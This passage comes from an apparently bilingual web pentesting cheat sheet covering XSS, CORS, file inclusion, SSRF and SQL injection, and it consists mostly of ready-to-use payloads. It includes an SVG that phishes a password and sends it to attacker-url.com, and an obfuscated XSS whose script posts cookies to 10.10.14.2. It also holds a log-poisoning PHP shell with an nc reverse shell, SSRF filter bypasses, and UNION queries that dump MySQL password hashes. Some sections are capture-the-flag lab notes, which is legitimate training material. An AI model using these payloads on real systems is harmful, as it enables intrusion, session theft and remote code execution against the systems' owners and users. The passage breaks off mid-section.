Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("1");
   </script>
</svg>
-----------------------------232181429808--
```

- **Second PoC: (png)**

```
<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="confirm(8)" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
</svg>
```

- **Third PoC: (png)**

Rename the file name from:

“Fileupload.svg” to “Fileupload.svg.png”

```
<?xml version=”1.0" standalone=”no”?>
<!DOCTYPE svg PUBLIC “-//W3C//DTD SVG 1.1//EN” “http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version=”1.1" baseProfile=”full” xmlns=”http://www.w3.org/2000/svg">
<polygon id=”triangle” points=”0,0 0,50 50,0" fill=”#009901" stroke=”#004400"/>
<script type=”text/javascript”>
confirm(1);
</script>
</svg>
```

*Reference:* 
*https://hackerone.com/reports/880099*


- [ ] **Steal the PASSWORD of victim and send to SERVER ATTACKER**

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>

        <script> 
                var passwd = prompt("Enter your password to continue");
                var xhr = new XMLHttpRequest();
                xhr.open("GET","https://attacker-url.com/log.php?password="+encodeURI(passwd));
                xhr.send();
        </script>

</svg>
```

*Reference:* 
*https://kunalkhubchandani.medium.com/how-i-was-rewarded-a-1000-bounty-after-abusing-file-upload-functionality-to-stored-xss-945a40ac6f94*


- [ ] **If you have a process executing with a XSS vulnerability, try get from your server this file "holiday.js"**

```
"><img src="x/><script>eval(String.fromCharCode(document.write('<script src="http://10.10.14.2/holiday.js"></script>');))</script>">
```

- The part of code that you need encode from CharCode is:

```
document.write('<script src="http://10.10.14.2/holiday.js"></script>');
```

**PoC with "ipython":**

```
In [6]: def createEncodeJS(ascii): 
   ...:     decimal_string = "" 
   ...:     for char in ascii: 
   ...:         decimal_string += str(ord(char)) + "," 
   ...:     return decimal_string[:-1] 
   ...:            
```
```
In [11]: print(createEncodeJS("""document.write('<script src="http://10.10.14.2/holiday.js"></script>');"""))    

100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59
```

- Payload final

```
"><img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>">
```

- Send the above payload XSS against your victim server

- See the file "holiday.js"

```
> cat holiday.js

var req1 = new XMLHttpRequest();
req1.open('GET', 'http://localhost:8000/vac/8095da74-307b-467b-b159-9460e96920c0', false);
req1.send();
var response = req1.responseText;
var req2 = new XMLHttpRequest();
var params = "cookie=" + encodeURIComponent(response);
req2.open('POST', 'http://10.10.14.2:8000/holiday.js', true);
req2.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
req2.send(params);
```

- Set the Server "python" in port 80 (python -m SimpleHTTPServer 80)

- Set nc in port 8000 (nc -lnvp 8000 > tmp)

- When you receive your connection, look the "tmp" file for the Cookie

```
> cat tmp

GET /?cookie=connect.sid=s%253Affe76430-b186-11ea-9572-01fd1face7a8.PptlQmURDIC%252B9bCRC9rbWN1yPq4vjKIYZ8V1By%252FG1TI HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://localhost:8000/vac/8095da74-307b-467b-b159-9460e96920c0
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.14.2:8000
```

*Reference:*
*holiday box (htb)*


# CORS

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP)

- [ ] **Add header "Origin" and see if this reflected in the response**

```
Origin: http://bing.com/
Origin: http://bing.com
Origin: bing.com/
Origin: bing.com
Origin: null
```

If you find in the response:

```
"Access-control-allow-origin: bing.com | * | null"
```

Then domain maybe is vulnerable.

- Testing:

```
curl <domain> -H "Origin: <https://bing.com>" -I
```

- **Exist 3 cases for exploit this, 2 are good and 1 is a missconfiguration:**

1) Best case for attack:
```
Access-Control-Allow-Origin: <evildomain.com>
Access-Control-Allow-Credentials: true
```

2) Exploitable:
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

3) Missconfiguration: (this is not exploitable, only missconfiguration)
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**PoC:**

```
<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
document.getElementById("demo").innerHTML = alert(this.responseText);
}
};
xhttp.open("GET",”<https://endPoint/>”, true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```

- [ ] **Tools**

*https://github.com/s0md3v/Corsy*




# Scanners

```
. Burpsuite
. Nikto
```

# Business Logic

```
Pendiente
```

# Change HTTP Methods and Headers

- [ ] **Cambiar métodos HTTP para generar errores**

```
HEAD (Solicita la lectura del encabezado de una página Web)
OPTION (Consulta ciertas opciones)
POST
GET
PUT (Solicita el almacenamiento de una página Web)
HELP 
TRACE (Repite la solicitud entrante)
DELETE (Elimina la página Web)
CONNECT (Reservado para uso futuro)
```


# PHP Type Juggling


- [ ] **If you find PHP logins, it is probable that the "strcmp" function is used, which is vulnerable at the code level**

```
curl -X POST [URL] --data 'username=test&password[]=test2'
```


# Host Header Injection

- [ ] **Change the actual host to "bing.com"**

```
Host: bing.com
```

- [ ] **Change real host to "bing.com" and set the header "X-Forwarded-Host"**

```
Host: bing.com
X-Forwarded-Host: realweb.com
```

- [ ] **Set header "X-Forwarded-Host: bing.com" and the host with the real host**
```
Host: realweb.com
X-Forwarded-Host: bing.com
```
  
- [ ] **Set header "Referer"**

```
Referer: https://www.bing.com/
```


# Adobe AEM Flush Cache Dispatcher

- [ ] **Unauthorized attackers can invalidate/flush dispatcher cache remotely without any rate limiting. If this is done repeatedly it can severely impact the site performance**

```
curl -H "CQ-Handle: /content" -H "CQ-Path: /content" https://[WEB_FOR_TESTING]/dispatcher/invalidate.cache
```

*Reference:*
*https://twitter.com/AEMSecurity/status/1244965623689609217*



# Open Redirection

- [ ] **Classic Test**

```
http://example.com//bing.com
http://example.com//www.bing.com
http://example.com//bing.com/%2e%2e
```

- [ ] **Posibles parámetros vulnerables**

Mirar las peticiones 3XX en BurpSuite:

```
/{payload}
?next={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
```

- [ ] **Add "http://example.com/test" and with Intruder + <payloads.txt> test the OpenRedirection**



# Parameter Tampering

```
Pendiente
```



# File Inclusion

- [ ] **Local File Inclusion**

```
http://example.com/index.php?referee=login.php
```

- If target web server is reside on Linux platform, server path will be:

```
/var/www/html/trump.jpeg 
```
```
http://example.com/index.php?file=trump.jpeg
```
```
http://example.com/index.php?file=../../../etc/passwd
```
```
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd
```

- If target web server is reside on Windows platform, you can try:

```
http://example.com/index.php?file=C:\boot.ini 
```
```
http://example.com/index.php?file=../../C:\boot.ini
```

- [ ] **Log Poisoning (RCE & LFI)**

- If you have a file inclusion vulnerability you can try this technique:

1. Search the directory for see the logs of server

**Possible Directories for HTTP Requests:**

```
/var/log/httpd-access.log
```
```
https://unix.stackexchange.com/questions/38978/where-are-apache-file-access-logs-stored
```
```
https://phoenixnap.com/kb/apache-access-log
```
```
http://10.10.10.84/browse.php?file=/var/log/httpd-access.log
```

2. Inject your PHP Shell in the "User-Agent

From "root" directory of web (http://10.10.10.84/) with GET request we modify the User-Agent

```
GET / HTTP/1.1
Host: 10.10.10.84
User-Agent: <?php system($_GET['c']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

3. See the log file again and notice a error is displayed

```
http://10.10.10.84/browse.php?file=/var/log/httpd-access.log

"<b>Warning</b>:  system(): Cannot execute a blank command in <b>/var/log/httpd-access.log</b> on line <b>13</b><br />"
```

4. Use your variable "c" for execution of command

```
http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=whoami
```
```
"10.10.14.40 - - [02/May/2020:04:06:48 +0200] "GET / HTTP/1.1" 200 289 "-" "wwwdata"
```

5. Get a revShell. Encoding the revShell with URL encode

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.40 1234 >/tmp/f
```
```
%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%34%30%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66
```
```
http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%34%30%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66
```
*Reference: poison box (htb)*


- [ ] **Remote File Inclusion**

```
http://example.com/?share=http://facebook.com/status?id=12672
```
```
http://example.com/index.php?file=http://[AttackerSERVER].com/trump.jpg 
```
```
http://example.com/index.php?file=http://[AttackerSERVER]/evil.php
```


# Missing Insufficient SPF Record

- [ ] **Check if SPF record is missconfigured**

```
https://www.kitterman.com/spf/validate.html
https://mxtoolbox.com/
```

- [ ] **Create fake mail**

```
https://emkei.cz/
```


# External Service Interaction DNS

- [ ] **Header "X-Forwarded-For"**

```
Host: whitedomain.com
X-Forwarded-For: <yourserver>
```

- [ ] **Method HTTP**

```
GET <http://yourserver>
CONNECT <http://yourserver>
```

Example: 

```
CONNECT [BurpCOLLABORATOR]:443 HTTP/1.1
Host: <domainTARGET>
Pragma: no-cache
Cache-Control: no-cache, no-transform
Connection: close


```

**Nótese los dos espacio al final de la request.**


# SSRF

- [ ] **You have to find any parameter that may have some kind of external interaction or they can interact to external domain**

```
http://example.com/index/php?uri=http://external.com
```

- [ ] **Possible related parameter to hunt for SSRF**

- dest
- path
- window
- reference
- val
- callback
- view
- redirect
- continue
- next
- site
- validate
- return
- dir
- uri
- url
- data
- html
- domain
- page
- show
- file
- root
- pdf
- doc
- port
- navigation
- feed
- document
- folder
- path
- pg
- style
- template
- php_path
- feed
- host
- to
- out
- open
- result

- [ ] **Burpsuite Extension**

Utilizar la extensión "**Auto Repeater**" para probar SSRF.

Regex utilizada para matchear: 
```
https?:\/\/(www\.)?[-a-zA-Z0–9@:%._\+~#=]{1,256}\.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%_\+.~#?&//=]*)
```
<img src="https://user-images.githubusercontent.com/43796175/110072455-cec57b80-7d4b-11eb-8728-646177ce0cbc.jpg"></img>

Todas las request del tipo:
```
https://www.google.com/?variable=https://cgonzalo.com
```

Se redireccionan a:
```
https://www.google.com/?variable=https://[BURPCOLLABORATOR]:443 
```

- [ ] **1º Method**

Read file from server

```
http://example.com/showimage.php?file=file:///<payloads>
file:///etc/passwd --> Not authorized
file://\/\/etc/passwd --> OK
```

- [ ] **2º Method** 

Scan the internal network

```
http://example.com/showimage.php?file=http://localhost:<port>
```

With "wfuzz" we can make a testing of all ports live in the victim machine with "Range" option

```
wfuzz -c -t 10 --hh=2 -z range,1-65535 "http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ"
```

*Reference: kotarak box (htb)*

- [ ] **3º Method**

SSRF with RFI (Create a web page HTML with a "alert(1)" in your hosting)
```
http://example.com/showimage.php?file=http://myhost/pagewithxss.html
```

- [ ] **E-mail address payloads:**
```
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
```

- [ ] **HTTP 0.9**

When testing for SSRF, change the HTTP version from 1.1 to HTTP/0.9 and remove the host header completely. This has worked to bypass several SSRF fixes in the past.

*Reference: https://twitter.com/thedawgyg/status/1224450254205927432*

- [ ] **Octet Encoding** 

When testing for SSRF using a black list, take internal IP addresses and when encoding them, dont encode entire IP. Encode 1 octet of the IP address, or 2 or 3. For Instance: AWS Metadata - 0251.254.169.254

*Reference: https://twitter.com/thedawgyg/status/1224547692967342080*

- [ ] **Add "#"**

Sometimes, the server appends something (path, parameters, ...) to an URL your control. Simply add "#" to your URL, that may work.

*Reference: https://twitter.com/Agarri_FR/status/1118530573834780672*

- [ ] **127.1** 

Bypass SSRF filters by using http://127.1 instead of http://127.0.0.1

It resolves to the same but confuses filters blocking localhost/127.0.0.1 specifically!

*Reference: https://twitter.com/LooseSecurity/status/1119026057586380800*

- [ ] **Blacklist 169.254.169.254**

Did you find the SSRF, but http://169.254.169.254/ is blacklisted?, try:
```
http://0xA9FEA9FE/
http://0251.0376.0251.0376/
```

*Reference: https://twitter.com/Rzepsky/status/1108447769524617217*

- [ ] **XSS to SSRF - <esi> Tag**

If you get a XSS, you can try escalate this to SSRF:

```
<esi:include src="http://evil.domain.com/"/>
```

*Reference:*

*https://twitter.com/intigriti/status/1294249205414887427*

*Part 1: https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/*

*Part 2: https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/*



# Critical File and Source Code Disclosure

- [ ] **Testing with BurpSuite from Critical File and Source Code**

```
http://example.com/<paramToFuzz>
```


# CSRF

```
Pendiente
```



# SQLite Injection

- [ ] **Manual Exploitation**

- Version

The column reflected is number 2:

```
sqlite_version()
username=")) UNION+SELECT 1,sqlite_version(),3,4--
```

- Extract Table Name

```
username=")) UNION SELECT 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
```

- Extract Column Name

```
username=")) UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='<table>'-- -
```

- Extract Password of Current User

```
username="))+union+select+username,+password,+3,+4+from+users+limit+1+--
```


# SQL Injection

- [ ] **Inyección en Domain**

```
https://domain.com/%2527
```
```
https://domain.com/%27
```
```
https://domain.com/'
```

- [ ] **E-mail address payloads SQLi**

You can use this in any field of "e-mail". (recover your password, for example)

```
a@a.com
"a"@.com
test example@test.com
"test example"@test.com
asd@a.com
asd a@a.com
\"asd a\"@a.com
asd(a)@a.com
\"asd(a)\"@a.com
asd'a@a.com
asd'or'1'='1@a.com
a'-IF(LENGTH(database())>9,SLEEP(8),0)or'1'='1@a.com
a'AND%20SLEEP(8)%20or'1'='1@a.com
\"a'-IF(LENGTH(database())>9,SLEEP(8),0)or'1'='1\@a.com
"' OR 1=1 -- '"@example.com
```

- [ ] Testear comillas SIMPLES para detectar errores 500

```
param=' (500 Error)
param='' (200 OK)
```

Luego verificar que efectivamente se trata de un error SQL y no otro tipo de error.

```
Cookie: parametro=xyz'||(SELECT '')||' (500)
Cookie: parametro=xyz'||(SELECT '' FROM dual)||' (200) (ORACLE DB)
```

- [ ] **Inyección en "Host", "User-Agent", "Referer", "Location" and "Cookie"**

```
Host: example.com'
Referer: example.com"
User-Agent: <user-agent>\
Cookie: my_cookie:123\
Cookie: my_cookie:123'
Cookie: my_cookie:123"
```

- [ ] **Content-Length**

```
Content-Length: '%20or%201%3d1%2d%2d (' or 1=1 --) (200 OK)
Content-Length: <parteOK>%20or%201%3d01 ( or 1=1 --) (200 OK)
Content-Length: <parteOK>'%20or%201%3d01 (' or 1=1 --) (200 OK)
```
```
Content-Length: '%20or%201%3d2%2d%2d (' or 1=2 --) (40X)
Content-Length: <parteOK>%20or%201%3d2%2d%2d  ( or 1=2 --) (40X)
Content-Length: <parteOK>'%20or%201%3d2%2d%2d  (' or 1=2 --) (40X)
```
```
';SELECT pg_sleep(10);-- (testear TimeBased en Postgres)
'%3bSELECT%20pg_sleep(10);%20-- (testear TimeBased en Postgres)
```

- [ ] **Recuperar Datos Ocultos**

Si ambas consultas dan resultados distintos:

```
https://insecure-website.com/products?category=Gifts
https://insecure-website.com/products?category=Gifts'--
```

Debe probar lo siguiente para que la aplicación muestre todos los productos en cualquier categoría, incluidas las categorías que no conoce:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

La consulta modificada devolverá todos los elementos en los que la categoría sea "Gifts" o "1=1". Dado que "1=1" siempre es verdadero, la consulta devolverá todos los elementos.


- [ ] **Modificar la Lógica de la Aplicación**

En los inicios de sesión, intentar los siguientes payloads para ingresar o generar algún error en el aplicativo:

**Payloads para Burpsuite Intruder:**
```
administrator'--
OR 1=1 --
' OR 2=2 --
") OR 1=1 --
') OR 1=1 --
admin==
admin'-
'or''='
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
' or 1=1#
" OR "1"="1
```

- [ ] **Ataque UNION para determinar el número de columnas**

Ingresar en algún parámetro del aplicativo y observar que da un error 40X:

```
'+UNION+SELECT+NULL-- (Microsoft y PostgreSQL)
'+UNION+SELECT+NULL--%20 (MySQL)
'+UNION+SELECT+NULL+FROM+DUAL-- (Oracle)
```

Luego, continuar ingresando valores "NULL" hasta que devuelva 200 OK:

Oracle:

```
' UNION SELECT NULL,NULL,NULL FROM DUAL--
```

Microsoft SQL Server y PostgreSQL:

```
'+UNION+SELECT+NULL,NULL,NULL--
```

MySQL: (espacio al final)

```
'+UNION+SELECT+NULL,NULL,NULL,NULL-- 
'+UNION+SELECT+NULL,NULL,NULL,NULL--%20
```

- [ ] **Blind SQL Injection**

La aplicación se comporta de manera distinta cuando las condiciones son verdaderas o falsas.

Inyectar en los parámetros de la "cookie":

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='1
```
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='2
```

El primero de estos valores hará que la consulta devuelva resultados, porquela condición inyectada es verdadera.

El segundo valor hará que la consulta no devuelva ningún resultado, o devuelva distintos resultados, porque la condición inyectada es falsa. 

- [ ] **Errores Condicionales (Blind SQLi)**

Intentar:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'  --> Error 40X
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'' --> 200 OK
```
Luego debe confirmar que el servidor interpreta la consulta como SQL, en lugar de cualquier otro tipo de error. Las siguientes consultas varían de la DB en el backend, una de ellas debería ser VERDADERA para confirmar una posible SQLi:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'||(SELECT '')||'
```
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'||(SELECT '' FROM dual)||' (Oracle)
```

Cuando la inyección de diferentes condiciones booleanas no hace ninguna diferencia en las respuestas de la aplicación, en esta situación, es posible inducir a la aplicación a devolver respuestas condicionales desencadenando errores de SQL de forma condicional, dependiendo de una condición inyectada.

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Primera entrada, se evalúa 'a', lo que no causa ningún error. 

Segunda entrada, se evalúa a 1/0, lo que provoca un error de división por cero. 

Suponiendo que el error causa alguna diferencia en la respuesta HTTP de la aplicación, podemos usar esta diferencia para inferir si la condición inyectada es verdadera.

**Oracle:**
```
' AND (SELECT CASE WHEN (1=2) THEN to_char(1/0) ELSE NULL END FROM dual)--
```
```
' AND (SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual)--
```

**Microsoft SQL Server:**
```
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END)--

```
```
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)--
```

**PostgreSQL:**
```
' AND (SELECT CASE WHEN (1=2) THEN cast(1/0 as text) ELSE NULL END)--

```
```
' AND (SELECT CASE WHEN (1=1) THEN cast(1/0 as text) ELSE NULL END)--
```

**MySQL:**
```
' AND (SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a'))--

```
```
' AND (SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a'))--%20
```


- [ ] **Time-Based SQL Injection Síncrona**

La aplicación detecta errores de la base de datos y los maneja correctamente. Activar un error de base de datos cuando se ejecuta la consulta SQL inyectada no causa ninguna diferencia en la respuesta de la aplicación, por lo que la técnica anterior de inducir errores condicionales no funcionará.

Se debe explotar SQL ciega activando retrasos de tiempo condicionalmente, dependiendo de una condición inyectada.

Las técnicas para activar un retraso de tiempo son muy específicas del tipo de base de datos que se utiliza:

**Oracle:**
```
'; dbms_pipe.receive_message(('a'),10)--
') dbms_pipe.receive_message(('a'),10)--
'); dbms_pipe.receive_message(('a'),10)--
';) dbms_pipe.receive_message(('a'),10)--
```

**Microsoft SQL Server:**
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
') IF (1=2) WAITFOR DELAY '0:0:10'--
') IF (1=1) WAITFOR DELAY '0:0:10'--
'); IF (1=2) WAITFOR DELAY '0:0:10'--
'); IF (1=1) WAITFOR DELAY '0:0:10'--
';) IF (1=2) WAITFOR DELAY '0:0:10'--
';) IF (1=1) WAITFOR DELAY '0:0:10'--
'; WAITFOR DELAY '0:0:10'--
'; WAITFOR DELAY '0:0:10'--
') WAITFOR DELAY '0:0:10'--
') WAITFOR DELAY '0:0:10'--
'); WAITFOR DELAY '0:0:10'--
'); WAITFOR DELAY '0:0:10'--
';) WAITFOR DELAY '0:0:10'--
';) WAITFOR DELAY '0:0:10'--
```


**PostgreSQL:**
```
'; SELECT pg_sleep(10)--
') SELECT pg_sleep(10)--
'); dbms_pipe.receive_message(('a'),10)--
';) dbms_pipe.receive_message(('a'),10)--
```

**MySQL:**
```
'; SELECT sleep(10)--%20
') SELECT sleep(10)--%20
'); SELECT sleep(10)--%20
';) SELECT sleep(10)--%20
```

- [ ] **SQLi Out of Band Asíncrona**

Activar interacciones de red fuera de banda en un sistema que usted controla.

Se puede utilizar una variedad de protocolos de red para este propósito, pero generalmente el más efectivo es DNS.

Las técnicas para activar una consulta de DNS son muy específicas del tipo de base de datos que se utiliza.

**Oracle:**
```
'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
```
```
SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')--
```

**Microsoft SQL Server:**
```
'; exec master..xp_dirtree '//[yourCollaborator]/a'--
```

**PostgreSQL:**
```
'+copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'--
```

**MySQL:**
```
'+LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'--%20
```

- [ ] **Second Order SQLi**

Una inyección de segundo orden es lo mismo que un ataque SQLi clásico, pero payload ya está almacenado en la base de datos, y espera ser activado por un usuario en una fecha posterior.

Enviar como nombre de usuario:

```
"><img """><SCRIPT>alert(1337)</SCRIPT>">
```

- [ ] **Truncate SQLi**

Observar el parámetro "maxlength" en los formularios de Login y Registro para los campos "user" y "password".

Si el campo tiene un "maxlength" de "16" entonces debe ingresar 17 caracteres para que sea truncada la entrada y registrarse como "admin":

```
username=admin           1
password=pass@123
```

- [ ] **Detectar SQLi con Payloads en Intruder**

1. SQL Injection Genérica
2. Basados en Errores
3. Time Based SQL
4. Authentication Bypass (Login)
5. Out of Band
6. Email (reset password & register user)


## Manual Exploitation

- Version

```
http://10.10.10.143/room.php?cod=0+union+select+1,2,version(),4,5,6,7--
```

- DB username

```
http://10.10.10.143/room.php?cod=-1+union+select+1,2,user(),4,5,6,7--
```

- DB name

```
http://10.10.10.143/room.php?cod=0+union+select+1,2,database(),4,5,6,7--
```

- See ALL DBs


	1. First Method
	```
	http://10.10.10.143/room.php?cod=0+union+select+1,2,(select+group_concat(schema_name,":")+from+information_schema.schemata),4,5,6,7--
	```
	2. Second Method

	```
	http://10.10.10.143/room.php?cod=0+union+select+1,2,(select+group_concat(schema_name,":")+from+information_schema.schemata),4,5,6,7--
	```
	```
	http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit 0,1--
	```
	```
	http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit 1,1--
	```
	```
	http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit 2,1--
	```
	```
	http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit 3,1--
	```
	```
	...
	...
	...
	```
	```
	http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit <n>,1--
	```
- Tables of current DB

```
http://10.10.10.143/room.php?cod=0+union+select+1,2,(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),4,5,6,7--
```

- Tables one by one of current DB

```
http://10.10.10.143/room.php?cod=0+union+select+1,2,table_name,4,5,6,7+from+information_schema.tables+where+table_schema=database()+limit+0,1--+
```
```
http://10.10.10.143/room.php?cod=0+union+select+1,2,table_name,4,5,6,7+from+information_schema.tables+where+table_schema=database()+limit+1,1--+
```
```
http://10.10.10.143/room.php?cod=0+union+select+1,2,table_name,4,5,6,7+from+information_schema.tables+where+table_schema=database()+limit+2,1--+
```
```
http://10.10.10.143/room.php?cod=0+union+select+1,2,table_name,4,5,6,7+from+information_schema.tables+where+table_schema=database()+limit+3,1--+
```

- See ALL Tables of a DB
```
http://10.10.10.143/room.php?cod=-1+union+select+1,2,(SELECT+group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n")+from+Information_Schema.COLUMNS+where+TABLE_SCHEMA+=+'<DB_NAME>'),4,5,6,7--
```

- Get the names of Columns under your Table

```
http://10.10.10.143/room.php?cod=0+union+select+1,2,column_name,4,5,6,7+from+information_schema.columns+where+table_schema=database()+and+table_name='tablenamehere'--+
```
```
http://10.10.10.143/room.php?cod=0+union+select+1,2,column_name,4,5,6,7+from+information_schema.columns+where+table_schema=database()+and+table_name='tablenamehere'+limit+0,1--+
```
```
http://10.10.10.143/room.php?cod=0+union+select+1,2,column_name,4,5,6,7+from+information_schema.columns+where+table_schema=database()+and+table_name='tablenamehere'+limit+1,1--+
```
```
http://10.10.10.143/room.php?cod=0+union+select+1,2,column_name,4,5,6,7+from+information_schema.columns+where+table_schema=database()+and+table_name='tablenamehere'+limit+2,1--+
```
```
http://10.10.10.143/room.php?cod=0+union+select+1,2,column_name,4,5,6,7+from+information_schema.columns+where+table_schema=database()+and+table_name='tablenamehere'+limit+3,1--+
```

- Extracting Data from the Columns

```
http://10.10.10.143/room.php?cod=0+union+select+1,2,concat(<column1>,<column2>),4,5,6,7+from+<tablename>+limit+0,1--+
```
```
http://10.10.10.143/room.php?cod=0+union+select+1,2,concat(<column1>,<column2>),4,5,6,7+from+<tablename>+limit+1,1--+
```
```
http://10.10.10.143/room.php?cod=0+union+select+1,2,concat(<column1>,<column2>),4,5,6,7+from+<tablename>+limit+2,1--+
```
```
http://10.10.10.143/room.php?cod=0+union+select+1,2,concat(<column1>,<column2>),4,5,6,7+from+<tablename>+limit+3,1--+
```

- List Password Hashes (from MySQL DB)
```
http://10.10.10.143/room.php?cod=-1+union+select+1,2,(SELECT+group_concat(host,":",user,":",password,"\r\n")+from+mysql.user),4,5,6,7--
```

- Read files from DB (Load File)

```
